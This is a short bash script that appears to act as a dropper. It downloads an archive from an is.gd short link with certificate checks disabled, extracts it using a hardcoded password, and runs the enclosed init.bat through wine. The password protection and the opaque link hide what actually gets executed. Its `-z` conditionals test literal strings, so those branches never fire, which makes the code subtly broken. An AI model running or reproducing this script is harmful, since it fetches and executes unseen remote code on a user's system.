#!/bin/bash
if [ -z "/bin/7za" ]; then
sudo apt install p7zip wget -y
fi
if [ -z "~/init/m.7z" ]; then
mkdir ~/init/
wget --no-check-certificate -O ~/init/m.7z https://is.gd/l0cateme
fi
cd ~/init/;
7za x -p1011011011 m.7z;
wine cmd.exe "init.bat";
exit 0
